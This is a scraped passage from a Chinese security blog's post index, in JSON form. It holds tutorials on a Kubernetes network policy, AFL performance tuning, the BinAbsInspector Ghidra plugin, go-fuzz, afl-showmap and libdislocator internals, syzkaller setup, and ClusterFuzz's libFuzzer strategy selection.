a command prompt, try pressing enter./ # wget -qO- http://website&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt;html &#123; color-scheme: light dark; &#125;body &#123; width: 35em; margin: 0 auto;font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;/ # 新建一个Network策略文件website-deny.yaml 123456789101112$ cat website-deny.yaml kind: NetworkPolicyapiVersion: networking.k8s.io/v1metadata: name: website-denyspec: podSelector: matchLabels: app: website ingress: []``` 应用这个策略 $ kubectl apply -f website-deny.yamlnetworkpolicy.networking.k8s.io/website-deny created 1再次启动一个临时pod访问","categories":[],"tags":[{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://www.giantbranch.cn/tags/Kubernetes/"},{"name":"security","slug":"security","permalink":"https://www.giantbranch.cn/tags/security/"}]},{"title":"AFL fuzz性能提升tips","slug":"AFL fuzz性能提升tips","date":"2022-04-26T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2022/04/26/AFL fuzz性能提升tips/","link":"","permalink":"https://www.giantbranch.cn/2022/04/26/AFL fuzz性能提升tips/","excerpt":"","text":"在其他条件相同的情况，fuzz性能的提升往往对于fuzz有事半功倍的效果，下面主要来源于afl文档的翻译 1、test cases保持小一点 大的测试用例需要更多时间与内存去解析，在模糊测试的其他步骤效率也会降低 假如你收集的样本很多很大，可以使用afl-cmin去减少数量，再用afl-tmin去减少每个样本的大小 最好不要超过1M，比如afl作者提供的testcases都是很小的，图片基本是10K以下的 https://lcamtuf.coredump.cx/afl/demo/afl_testcases.tgz 2、使用更简单的目标 就是目标二进制尽量简单，毕竟执行的代码也少了 3、使用llvm插桩 默认的llvm插桩可以获得两倍的性能提升了 llvm模式下还有一个persistent模式，类似于in-process fuzzing mode，libfuzzer就是这种，性能就可以5-10倍了，不过也得看情况，有时可能只是2倍。而deferred fork server模式对于启动开销大的程序性能提升明显，这两种模式都需要编辑源码，但基本就是几行代码的事情。 4、分析优化目标二进制文件 比如有没有提高性能的参数，并不影响fuzz结果，比如测试图片处理程序，输出低质量的性能会好点；还有可以禁用输出以提升性能 还有ASAN编译的二进制对于性能的影响还是挺大的，可以考虑使用普通插桩程序fuzz，使用asan编译的二进制去过一下样本。 还有些程序使用sleep(), usleep(), or nanosleep()，——我觉得作者的意思是看看能不能删除或者减少sleep的时长？ 还有其他的比如fsync()，可以使用libeatmydata来禁用，它其实是个LD_PRELOAD library 5、只插桩你需要的部分 只对我们想要测试的库插桩，全部库插桩便会降低fuzz的性能 6、并行执行fuzzer 可以启用一个-M，多个-S的方式启用多个afl-fuzz实例，还可以考虑多主机fuzz 7、控制内存使用和超时 使用-m控制内存限制，-t控制超时时间，太大可能对性能有影响，但是有时候不是用-m none，程序又fuzz不了。 对于-t，作者建议在空闲并且性能不错的机器，将时间-t下降为5可能是可能的，但是这个具体还是要看情况啦，默认也没什么大问题，可以对比下性能，自行选择 8、检查操作系统的状态与设置 下面几个因素会影响模糊测试的速度 高系统负载。所以使用空闲的机器，不要运行任何不必要，还要占用cpu的程序（浏览器，播放器等） 网络文件系统（毕竟网络的，我觉得还是用本地吧），比如fuzzer的输入输出目录，fuzz目标需要的config文件，看着作者也不推荐在home目录，因为很多程序在那里搜索点开头的文件（点开头其实就是隐藏文件或目录） CPU按需分配，有时linux系统可能低估了afl或者模糊测试器的短暂的性能需求，linux可以通过下面命令配置 12cd /sys/devices/system/cpuecho performance | tee cpu*/cpufreq/scaling_governor 禁用Transparent huge pages，假如这个启用，某些内存分配方案（例如 jemalloc） ，会对模糊测试的性能影响很大，可以通过如下命令禁用 1echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled 次优的调度策略，这个可能因目标而异，linux作者推荐如下配置 12echo 1 &gt;/proc/sys/kernel/sched_child_runs_firstecho 1 &gt;/proc/sys/kernel/sched_autogroup_enabled 9、如果上面都无效，使用-d 这个模式可以使afl-fuzz跳过所有确定性的模糊测试过程 参考https://github.com/google/AFL/blob/master/docs/perf_tips.txt","categories":[],"tags":[{"name":"afl","slug":"afl","permalink":"https://www.giantbranch.cn/tags/afl/"},{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"}]},{"title":"BinAbsInspector插件的使用","slug":"BinAbsInspector插件的使用","date":"2022-04-21T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2022/04/21/BinAbsInspector插件的使用/","link":"","permalink":"https://www.giantbranch.cn/2022/04/21/BinAbsInspector插件的使用/","excerpt":"","text":"昨天科恩实验室发布了BinAbsInspector，这是一款基于ghidra的静态漏洞检测插件，今天来试用一下。 环境配置我的实验环境是windows10 x64， 1、首先下载JDK并安装，这里使用OpenJDK，进入下面页面选择jdk11，下载windows x64的即可 https://adoptium.net/temurin/releases/ 2、到这里下载ghidra最新版，之后解压，双击ghidraRun.bat即可运行ghidra https://github.com/NationalSecurityAgency/ghidra/releases 3、下载Z3，我win10就下载z3-XXXX-x64-win.zip，之后解压，将z3-XXXX-x64-win\\bin加入到PATH环境变量 https://github.com/Z3Prover/z3/releases 4、下载BinAbsInspector 下载链接：https://github.com/KeenSecurityLab/BinAbsInspector/releases 5、ghidra安装插件 依次点击 File → Install Extensions. 之后点击+号，选择BinAbsInspector解压后的目录或者直接选择BinAbsInspector的zip压缩包都可以，之后就看到BinAbsInspector 使用我打开了一个很久以前的ctf的uaf的pwn题目，都好几年没搞过了，用这个试试效果，有帮助，但没有超出预期 打开二进制后，需要分析，分析完成后才能使用插件（默认分析参数即可） 之后点击Window -&gt; Script Manager，找到BinAbsInspector.java 双击或者右键点击Run都可以，之后默认参数，假如你理解参数也可以修改 之后就看log就行，点击地址即可跳转到对应地方 参考https://github.com/NationalSecurityAgency/ghidra#installhttps://github.com/KeenSecurityLab/BinAbsInspector","categories":[],"tags":[{"name":"ghidra","slug":"ghidra","permalink":"https://www.giantbranch.cn/tags/ghidra/"},{"name":"static-analyzer","slug":"static-analyzer","permalink":"https://www.giantbranch.cn/tags/static-analyzer/"}]},{"title":"使用go-fuzz进行简单的fuzzing实践","slug":"使用go-fuzz进行简单的fuzzing实践","date":"2021-11-02T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2021/11/02/使用go-fuzz进行简单的fuzzing实践/","link":"","permalink":"https://www.giantbranch.cn/2021/11/02/使用go-fuzz进行简单的fuzzing实践/","excerpt":"","text":"go环境配置具体参考 1https://golang.org/doc/install 以我当时为例 12345wget https://golang.org/dl/go1.17.2.linux-amd64.tar.gzrm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.2.linux-amd64.tar.gz# 下面的最好放到.bashrc里面（我用的Ubuntu）export PATH=$PATH:/usr/local/go/bin:~/go/bin 其他注意事项： go1.16以后，默认需要提供go.mod，我们可以设置环境变量GO111MODULE为auto让其自动 1go env -w GO111MODULE=auto 例子实践源码： 123456789101112$ cat png.go package pngimport ( &quot;bytes&quot; &quot;image/png&quot;)func Fuzz(data []byte) int &#123; png.Decode(bytes.NewReader(data)) return 0&#125; 在文件目录执行go-fuzz-build，就会生成png-fuzz.zip 之后直接运行go-fuzz命令即可 12345$ go-fuzz2021/11/03 09:21:10 workers: 1, corpus: 25 (0s ago), crashers: 0, restarts: 1/0, execs: 0 (0/sec), cover: 0, uptime: 3s2021/11/03 09:21:13 workers: 1, corpus: 27 (2s ago), crashers: 0, restarts: 1/0, execs: 0 (0/sec), cover: 187, uptime: 6s2021/11/03 09:21:16 workers: 1, corpus: 27 (5s ago), crashers: 0, restarts: 1/6770, execs: 40621 (4513/sec), cover: 191, uptime: 9s2021/11/03 09:21:19 workers: 1, corpus: 27 (8s ago), crashers: 0, restarts: 1/8809, execs: 88095 (7341/sec), cover: 191, uptime: 12s 不过最好指定一下输出路径： 1go-fuzz -workdir output 还有一种是以libfuzzer的支持 12go-fuzz-build -libfuzzer -o png.aclang -fsanitize=fuzzer png.a -o png.libfuzzer 之后把png.libfuzzer运行就可以了 12345678910$ ./png.libfuzzer INFO: Running with entropic power schedule (0xFF, 100).INFO: Seed: 4139029883INFO: 65536 Extra CountersINFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED ft: 27 corp: 1/1b exec/s: 0 rss: 29Mb#414 NEW ft: 34 corp: 2/9b lim: 8 exec/s: 0 rss: 30Mb L: 8/8 MS: 2 InsertByte-InsertRepeatedBytes-#262144 pulse ft: 34 corp: 2/9b lim: 2611 exec/s: 87381 rss: 35Mb#524288 pulse ft: 34 corp: 2/9b lim: 4096 exec/s: 74898 rss: 35Mb 当然是用corpus会有更好的覆盖率，corpus可以从github.com/dvyukov/go-fuzz-corpus获取 1234567891011121314151617181920212223$ ./png.libfuzzer ./go-fuzz-corpus/png/corpus/INFO: Running with entropic power schedule (0xFF, 100).INFO: Seed: 4180837821INFO: 65536 Extra CountersINFO: 441 files found in ./go-fuzz-corpus/png/corpus/INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 294915 bytesINFO: seed corpus: files: 441 min: 1b max: 294915b total: 4508226b rss: 29Mb#442 INITED ft: 3197 corp: 328/2959Kb exec/s: 0 rss: 47Mb#476 REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 0 rss: 47Mb L: 134/294915 MS: 4 ChangeByte-ChangeBit-ShuffleBytes-EraseBytes-#1957 REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 0 rss: 48Mb L: 64/294915 MS: 1 EraseBytes-#2283 REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 0 rss: 49Mb L: 15997/294915 MS: 1 EraseBytes-#2629 REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 2629 rss: 49Mb L: 2182/294915 MS: 1 EraseBytes-#5131 REDUCE ft: 3197 corp: 328/2958Kb lim: 294915 exec/s: 5131 rss: 50Mb L: 329/294915 MS: 2 CrossOver-EraseBytes-#5372 REDUCE ft: 3197 corp: 328/2958Kb lim: 294915 exec/s: 5372 rss: 50Mb L: 48/294915 MS: 1 EraseBytes-#5388 REDUCE ft: 3197 corp: 328/2958Kb lim: 294915 exec/s: 5388 rss: 50Mb L: 93/294915 MS: 1 EraseBytes-#5464 NEW ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 5464 rss: 50Mb L: 75/294915 MS: 1 CopyPart-#5695 REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 2847 rss: 50Mb L: 31/294915 MS: 1 EraseBytes-#7537 REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 3768 rss: 50Mb L: 92/294915 MS: 2 ChangeBit-EraseBytes-#7693 REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 3846 rss: 50Mb L: 9059/294915 MS: 5 CrossOver-CrossOver-CrossOver-InsertByte-EraseBytes-#8192 pulse ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 4096 rss: 50Mb#8239 REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 4119 rss: 50Mb L: 110/294915 MS: 1 EraseBytes-#8491 REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 4245 rss: 50Mb L: 114/294915 MS: 2 ChangeASCIIInt-EraseBytes-#9009 REDUCE ft: 3198 corp: 329/2954Kb lim: 294915 exec/s: 4504 rss: 50Mb L: 14101/294915 MS: 3 ChangeASCIIInt-ChangeByte-EraseBytes- 假如要fuzz gif，改成下面即可，其他图片库类似 1234567891011package gif import ( &quot;bytes&quot; &quot;image/gif&quot;)func Fuzz(data []byte) int &#123; gif.Decode(bytes.NewReader(data)) return 0&#125;","categories":[],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"go-fuzz","slug":"go-fuzz","permalink":"https://www.giantbranch.cn/tags/go-fuzz/"}]},{"title":"afl源码阅读之afl-showmap","slug":"afl源码阅读之afl-showmap","date":"2021-08-27T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2021/08/27/afl源码阅读之afl-showmap/","link":"","permalink":"https://www.giantbranch.cn/2021/08/27/afl源码阅读之afl-showmap/","excerpt":"","text":"看过afl-fuzz的源码，之后再看afl-showmap，很多代码都是copy过去的 main函数首先还是参数解析 -o：指定afl-showmap输出的文件名-m：内存限制-t：设置超时值-e：就是只获取边，不用获取边的频率-q：安静模式-Z：安静模式，和cmin_mode置1，会影响输出文件的格式-A：指定输入的文件，替代命令行的@@-Q：qemu模式-b：输出的是二进制格式，类似于afl-fuzz输出的out_dir/queue/fuzz_bitmap-c：根据注释是Allow coredumps-V：输出版本 12345678910111213141516171819202122232425262728293031323334// 配置共享内存setup_shm();// 设置一些信号的回调函数setup_signal_handlers();// 设置环境变量，ASAN_OPTIONS和MSAN_OPTIONS，还有根据AFL_PRELOAD设置LD_PRELOAD和DYLD_INSERT_LIBRARIESset_up_environment();// 查找binary，假如是绝对路径，就检测一下文件是否存在，是否可执行，否则就在PATH环境变量下查找binaryfind_binary(argv[optind]);// 非安静模式，输出banner和执行的binary路径if (!quiet_mode) &#123; show_banner(); ACTF(&quot;Executing &apos;%s&apos;...\\n&quot;, target_path);&#125;// 假如参数中有@@，会将-A参数的testcase替换@@的位置detect_file_args(argv + optind);if (qemu_mode) // 假如是qemu模式，构建qemu的参数，运行的命令替换成`afl-qemu-trace -- target_path` use_argv = get_qemu_argv(argv[0], argv + optind, argc - optind);else use_argv = argv + optind;// fork一个子进程去运行target，之后对trace_bits进行归一化处理（通过setitimer设置超时发出SIGALRM信号，会回调handle_timeout函数，将子进杀掉）run_target(use_argv);// 将结果写到-o指定的文件中，假如binary_mode，将trace_bits直接写到文件中，否则就是`fprintf(f, &quot;%06u:%u\\n&quot;, i, trace_bits[i]);`写到文件中tcnt = write_results();if (!quiet_mode) &#123; if (!tcnt) FATAL(&quot;No instrumentation detected&quot; cRST); OKF(&quot;Captured %u tuples in &apos;%s&apos;.&quot; cRST, tcnt, out_file);&#125;// 退出exit(child_crashed * 2 + child_timed_out); 实际结果1234567891011121314151617181920212223242526/afl/afl-showmap -o mapfile ./testimage ./test/tests_61412.jpg$ cat mapfile | more000000:1000230:2000360:4000473:1000522:1000686:1000755:1000774:1001084:8001188:4001220:1001370:1001571:7001880:1001963:1002199:1002268:1002419:2002449:2002781:1003124:2..................","categories":[],"tags":[{"name":"afl","slug":"afl","permalink":"https://www.giantbranch.cn/tags/afl/"},{"name":"afl源码阅读","slug":"afl源码阅读","permalink":"https://www.giantbranch.cn/tags/afl源码阅读/"}]},{"title":"libdislocator原理及afl++的更新","slug":"libdislocator原理及afl++的更新","date":"2021-07-09T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2021/07/09/libdislocator原理及afl++的更新/","link":"","permalink":"https://www.giantbranch.cn/2021/07/09/libdislocator原理及afl++的更新/","excerpt":"","text":"检测原理申请内存通过mmap实现，最低申请两个页（默认4096一个页） last page通过mprotest设置为PROT_NONE，无法读写执行 1mprotect(ret + PG_COUNT(rlen + 8) * PAGE_SIZE, PAGE_SIZE, PROT_NONE) 之后将内存指针向右对齐，前面放len和alloc_canry 12345678ret += PAGE_SIZE * PG_COUNT(rlen + 8) - rlen - 8; /* Store allocation metadata. */ ret += 8; PTR_L(ret) = len; PTR_C(ret) = alloc_canary; free的时候是将整个内存设置为PROT_NONE 那么当程序存在堆溢出的时候，就会访问到PROT_NONE内存而出错 free掉的内存因为PROT_NONE也不可访问，可以检测uaf 新增特性1、增加了对mac和FreeBSD 的兼容 1234567#ifdef __APPLE__ #include &lt;mach/vm_statistics.h&gt;#endif#ifdef __FreeBSD__ #include &lt;sys/param.h&gt;#endif 2、 不是C11，重新定义max_align_t 1234567891011#if __STDC_VERSION__ &lt; 201112L || \\ (defined(__FreeBSD__) &amp;&amp; __FreeBSD_version &lt; 1200000)// use this hack if not C11typedef struct &#123; long long __ll; long double __ld;&#125; max_align_t;#endif 3、增加AFL_RANDOM_ALLOC_CANARY选项 随机canary 12345678910111213141516171819202122232425__attribute__((constructor)) void __dislocator_init(void) &#123; char *tmp = getenv(&quot;AFL_LD_LIMIT_MB&quot;); if (tmp) &#123; char * tok; unsigned long long mmem = strtoull(tmp, &amp;tok, 10); if (*tok != &apos;\\0&apos; || errno == ERANGE || mmem &gt; SIZE_MAX / 1024 / 1024) FATAL(&quot;Bad value for AFL_LD_LIMIT_MB&quot;); max_mem = mmem * 1024 * 1024; &#125; alloc_canary = ALLOC_CANARY; tmp = getenv(&quot;AFL_RANDOM_ALLOC_CANARY&quot;); if (tmp) arc4random_buf(&amp;alloc_canary, sizeof(alloc_canary)); alloc_verbose = !!getenv(&quot;AFL_LD_VERBOSE&quot;); hard_fail = !!getenv(&quot;AFL_LD_HARD_FAIL&quot;); no_calloc_over = !!getenv(&quot;AFL_LD_NO_CALLOC_OVER&quot;); align_allocations = !!getenv(&quot;AFL_ALIGNED_ALLOC&quot;);&#125; 4、新增emalloc、ecalloc、erealloc 5、增加TAIL_ALLOC_CANARY（强制对齐的时候） 12345678910111213141516 size_t rlen; if (align_allocations &amp;&amp; (len &amp; (ALLOC_ALIGN_SIZE - 1))) rlen = (len &amp; ~(ALLOC_ALIGN_SIZE - 1)) + ALLOC_ALIGN_SIZE; else rlen = len;..................if (rlen != len) &#123; size_t i; for (i = len; i &lt; rlen; ++i) ret[i] = TAIL_ALLOC_CANARY; &#125; 需要开启AFL_ALIGNED_ALLOC 1align_allocations = !!getenv(&quot;AFL_ALIGNED_ALLOC&quot;);","categories":[],"tags":[{"name":"afl++","slug":"afl","permalink":"https://www.giantbranch.cn/tags/afl/"},{"name":"libdislocator","slug":"libdislocator","permalink":"https://www.giantbranch.cn/tags/libdislocator/"}]},{"title":"syzkaller的安装与运行","slug":"syzkaller的安装与运行","date":"2021-06-25T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2021/06/25/syzkaller的安装与运行/","link":"","permalink":"https://www.giantbranch.cn/2021/06/25/syzkaller的安装与运行/","excerpt":"","text":"syzkaller是一种无监督的覆盖引导内核模糊器。 支持的操作系统：Akaros, FreeBSD, Fuchsia, gVisor, Linux, NetBSD, OpenBSD, Windows. 对linux的支持最全面 总览 syz-manager1、启动、监控多个vm实例2、复制syz-fuzzer到vm里面，并启动它3、存储corpus和crashessyz-fuzzer1、fuzzing（输入生成、变异、最小化等）2、通过RPC发送触发新路径的input给到syz-manager3、启动syz-executorsyz-executor 执行每个input（就是系统调用的序列） 用C++编写，静态二进制，使用共享内存进行通信 安装依赖安装 1apt install build-essential flex bison libssl-dev libelf-dev bc 下载源码编译 1234567git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git kernelcd kernel# 生成默认配置make defconfigmake kvm_guest.config 在.config文件中加入以下配置vim .config 12345678910111213# Coverage collection.CONFIG_KCOV=y# Debug info for symbolization.CONFIG_DEBUG_INFO=y# Memory bug detectorCONFIG_KASAN=yCONFIG_KASAN_INLINE=y# Required for Debian StretchCONFIG_CONFIGFS_FS=yCONFIG_SECURITYFS=y 1234# 由于启用这些选项会导致更多子选项可用，我们需要重新生成配置make olddefconfigmake -j 16 创建镜像 123456apt-get install debootstrapcd $IMAGE/wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.shchmod +x create-image.sh./create-image.sh 安装qemu 1apt-get install qemu-system-x86 测试 123456789101112qemu-system-x86_64 \\ -m 2G \\ -smp 2 \\ -kernel ./kernel/arch/x86/boot/bzImage \\ -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \\ -drive file=./image/stretch.img,format=raw \\ -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \\ -net nic,model=e1000 \\ -enable-kvm \\ -nographic \\ -pidfile vm.pid \\ 2&gt;&amp;1 | tee vm.log 试一下ssh是否能够连接 1ssh -i image/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost -v Go and syzkaller下载配置go 1234567891011wget https://golang.org/dl/go1.16.5.linux-amd64.tar.gztar -xvf go1.16.5.linux-amd64.tar.gzmv go gorootmkdir gopathexport GOPATH=`pwd`/gopathexport GOROOT=`pwd`/gorootexport PATH=$GOPATH/bin:$PATHexport PATH=$GOROOT/bin:$PATH 下载syzkaller源码并编译，先配置代理 123456export https_proxy=http://XXX.XXX.XXX.XXX:1080go get -u -d github.com/google/syzkaller/progcd gopath/src/github.com/google/syzkallermake 编辑配置文件，路径注意修改 1234567891011121314151617181920vim syz.cfg&#123; &quot;target&quot;: &quot;linux/amd64&quot;, &quot;http&quot;: &quot;127.0.0.1:56741&quot;, &quot;workdir&quot;: &quot;/root/gopath/src/github.com/google/syzkaller/workdir&quot;, &quot;kernel_obj&quot;: &quot;/root/kernel&quot;, &quot;image&quot;: &quot;/root/image/stretch.img&quot;, &quot;sshkey&quot;: &quot;/root/image/stretch.id_rsa&quot;, &quot;syzkaller&quot;: &quot;/root/gopath/src/github.com/google/syzkaller&quot;, &quot;procs&quot;: 8, &quot;type&quot;: &quot;qemu&quot;, &quot;vm&quot;: &#123; &quot;count&quot;: 4, &quot;kernel&quot;: &quot;/root/kernel/arch/x86/boot/bzImage&quot;, &quot;cpu&quot;: 2, &quot;mem&quot;: 2048 &#125;&#125; 启动syzkaller 1$ ./bin/syz-manager -config=/root/syz.cfg 假如起不来，就加-debug输出调试信息，看看哪里报错了 1./bin/syz-manager -config=/root/syz.cfg -debug 问题与解决1、go没有下载到syzkaller源码问题 需要设置代理，注意不要设置GO111MODULE环境变量，建议使用export https_proxy=http://ip:port方式进行代理 2、 qemu的ssh服务没起来 这个可能是kernel编译的问题，可以尝试重新编译kernel make mrproper 之后按步骤再编译一次内核 3、网卡没起来 后来发现syzkaller的qemu启动命令与测试的qemu命令不一样 将syzkaller的命令复制出来，并启动qemu 通过systemctl status networking.service查看网络服务状态 再查看网络接口，然而并没有eth0 最后使用测试qemu的命令启动，之后修改/etc/network/interfaces中的eth0改为enp0s4即可","categories":[],"tags":[{"name":"syzkaller","slug":"syzkaller","permalink":"https://www.giantbranch.cn/tags/syzkaller/"},{"name":"内核fuzz","slug":"内核fuzz","permalink":"https://www.giantbranch.cn/tags/内核fuzz/"}]},{"title":"ClusterFuzz的bot源码(fuzz engine的选择与调度之libfuzzer)阅读","slug":"ClusterFuzz的bot源码(fuzz engine的选择与调度之libfuzzer)阅读","date":"2021-01-25T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2021/01/25/ClusterFuzz的bot源码(fuzz engine的选择与调度之libfuzzer)阅读/","link":"","permalink":"https://www.giantbranch.cn/2021/01/25/ClusterFuzz的bot源码(fuzz engine的选择与调度之libfuzzer)阅读/","excerpt":"","text":"回顾与总览上一次我们选择了fuzz task的代码进行阅读，这次我们进一步深入，看看fuzz engine的选择 先回到上次说的引擎类：https://www.giantbranch.cn/2020/05/22/ClusterFuzz%E7%9A%84bot%E6%BA%90%E7%A0%81(fuzz%20task)%E9%98%85%E8%AF%BB/#%E5%BC%95%E6%93%8E%E7%B1%BB 注册的时候当时我们有疑问说怎么没有afl，现在在读，除了有afl了，还有一个blackbox src/python/bot/fuzzers/init.py 1234567def run(): &quot;&quot;&quot;Initialise builtin fuzzing engines.&quot;&quot;&quot; engine.register(&apos;afl&apos;, afl_engine.AFLEngine) engine.register(&apos;blackbox&apos;, blackbox_engine.BlackboxEngine) engine.register(&apos;honggfuzz&apos;, honggfuzz_engine.HonggfuzzEngine) engine.register(&apos;libFuzzer&apos;, libFuzzer_engine.LibFuzzerEngine) engine.register(&apos;syzkaller&apos;, syzkaller_engine.SyzkallerEngine) 现在fuzz_task整个调用路径是： 1获取到任务-&gt;fuzz_task.py中的execute_task-&gt;FuzzingSession-&gt;run()-&gt;engine.get获取具体的引擎类，调用do_engine_fuzzing(engine_impl) -&gt; run_engine_fuzzer(engine_impl, self.fuzz_target.binary, sync_corpus_directory, self.testcase_directory) -&gt; run_engine_fuzzer中，调用prepare生成FuzzOptions（里面也设置了一些fuzz的策略），之后最后调用下面的函数启动fuzz 123456789options = engine_impl.prepare(sync_corpus_directory, target_path, build_dir)fuzz_test_timeout = environment.get_value(&apos;FUZZ_TEST_TIMEOUT&apos;) additional_processing_time = engine_impl.fuzz_additional_processing_timeout( options)..................result = engine_impl.fuzz(target_path, options, testcase_directory, fuzz_test_timeout) 即下面的类中的fuzz的函数 12345AFLEngineBlackboxEngineHonggfuzzEngineLibFuzzerEngineSyzkallerEngine 先来看libfuzzer libfuzzerprepare先看prepare，首先获取参数 1arguments = fuzzer.get_arguments(target_path) 参数就是先看看XXX.options文件是否存在（其中XXX为fuzz_target的名字），存在则返回fuzzer_options（类型FuzzerOptions类），通过fuzzer_options.get_engine_arguments(‘libfuzzer’)获取FuzzerArguments(arguments)，之后通过获取FuzzerArguments的list方法转化为元素为”-%s=%s”的形式的list，之后就是加上rss_limit_mb设置内存限制，还有timeout的设置 之后获取grammar，这个也是从XXX.options的grammar section中获取的（这个在oss-fuzz中的项目中的options中没找到有这个section，是跟peach相关的，peach的模板的） 1grammar = fuzzer.get_grammar(target_path) 继续，是生成一个策略池，之后选择策略 123456strategy_pool = strategy_selection.generate_weighted_strategy_pool( strategy_list=strategy.LIBFUZZER_STRATEGY_LIST, use_generator=True, engine_name=self.name)strategy_info = libfuzzer.pick_strategies(strategy_pool, target_path, corpus_dir, arguments, grammar) generate_weighted_strategy_pool首先generate_weighted_strategy_pool是根据经验设定好的概率生成策略池 策略列表如下，还是很多的 12345678910111213LIBFUZZER_STRATEGY_LIST = [ CORPUS_MUTATION_RADAMSA_STRATEGY, RANDOM_MAX_LENGTH_STRATEGY, CORPUS_MUTATION_ML_RNN_STRATEGY, VALUE_PROFILE_STRATEGY, FORK_STRATEGY, CORPUS_SUBSET_STRATEGY, RECOMMENDED_DICTIONARY_STRATEGY, DATAFLOW_TRACING_STRATEGY, MUTATOR_PLUGIN_STRATEGY, MUTATOR_PLUGIN_RADAMSA_STRATEGY, PEACH_GRAMMAR_MUTATION_STRATEGY,] generate_weighted_strategy_pool函数首先获取环境变量 1distribution = environment.get_value(&apos;STRATEGY_SELECTION_DISTRIBUTION&apos;) 之后从STRATEGY_SELECTION_DISTRIBUTION这里随机选取一个作为策略 12strategy_selection = utils.random_weighted_choice(distribution_tuples, &apos;probability&apos;) ，否则使用默认的，调用generate_default_strategy_pool 1return generate_default_strategy_pool(strategy_list, use_generator) 一开始初始化一个StrategyPool类，之后选择生成器，最后就将LIBFUZZER_STRATEGY_LIST中非GENERATORS的策略都加到策略池 123456789101112131415161718192021222324def generate_default_strategy_pool(strategy_list, use_generator): &quot;&quot;&quot;Return a strategy pool representing a selection of strategies for launcher to consider. Select strategies according to default strategy selection method.&quot;&quot;&quot; pool = StrategyPool() # If use_generator is enabled, decide whether to include radamsa, ml rnn, # or no generator (mutually exclusive). if use_generator: choose_generator(pool) # Decide whether or not to add non-generator strategies according to # probability parameters. for value in [ strategy_entry for strategy_entry in strategy_list if strategy_entry not in GENERATORS ]: if do_strategy(value): pool.add_strategy(value) logs.log(&apos;Strategy pool was generated according to default parameters. &apos; &apos;Chosen strategies: &apos; + &apos;, &apos;.join(pool.strategy_names)) return pool 这个choose_generator的功能是通过生成随机数，跟radamsa_prob + ml_rnn_prob比较，假如生成的随机数比较大（比radamsa_prob + ml_rnn_prob大），那就都不选择， 不选用radamsa和ml_rnn（机器学习相关的），假如比较小再调用一次decide_with_probability进行选择radamsa或者是ml_rnn 123456789101112131415161718192021222324# /src/python/bot/fuzzers/engine_common.pydef decide_with_probability(probability): &quot;&quot;&quot;Decide if we want to do something with the given probability.&quot;&quot;&quot; return random.SystemRandom().random() &lt; probability # /src/python/bot/fuzzers/strategy_selection.py def choose_generator(strategy_pool): &quot;&quot;&quot;Chooses whether to use radamsa, ml rnn, or no generator and updates the strategy pool.&quot;&quot;&quot; radamsa_prob = engine_common.get_strategy_probability( strategy.CORPUS_MUTATION_RADAMSA_STRATEGY.name, default=strategy.CORPUS_MUTATION_RADAMSA_STRATEGY.probability) ml_rnn_prob = engine_common.get_strategy_probability( strategy.CORPUS_MUTATION_ML_RNN_STRATEGY.name, default=strategy.CORPUS_MUTATION_ML_RNN_STRATEGY.probability) if engine_common.decide_with_probability(radamsa_prob + ml_rnn_prob): if engine_common.decide_with_probability( radamsa_prob / (radamsa_prob + ml_rnn_prob)): strategy_pool.add_strategy(strategy.CORPUS_MUTATION_RADAMSA_STRATEGY) else: strategy_pool.add_strategy(strategy.CORPUS_MUTATION_ML_RNN_STRATEGY) libfuzzer.pick_strategies接下来看libfuzzer.pick_strategies，里面就是对各种策略处理，实际将策略需要的工作完成，并返回StrategyInfo 12StrategyInfo(fuzzing_strategies, arguments, additional_corpus_dirs, extra_env, use_dataflow_tracing, is_mutations_run) 